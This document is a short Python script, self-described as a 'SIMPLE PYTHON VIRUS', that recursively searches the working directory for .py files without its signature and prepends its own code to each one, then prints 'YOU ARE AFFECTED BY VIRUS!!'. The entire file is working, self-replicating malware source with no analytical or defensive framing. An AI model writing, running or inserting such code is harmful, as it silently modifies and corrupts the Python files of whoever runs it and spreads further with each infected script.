#!/usr/bin/python
import os
SIGNATURE = "SIMPLE PYTHON VIRUS"

def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        # store filename to filestoinfect
        if os.path.isdir(path+"/"+fname): 
            filestoinfect.extend(search(path+"/"+fname))
        #check if the file is a .py file and if it been infected already
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect

def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i >= 0 and i < 39:
            virusstring += line
    virus.close
    virusstring += "\n"
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

filestoinfect = search(os.path.abspath(""))
print(len(filestoinfect)) #test reasons
infect(filestoinfect)
print ("YOU ARE AFFECTED BY VIRUS!!")

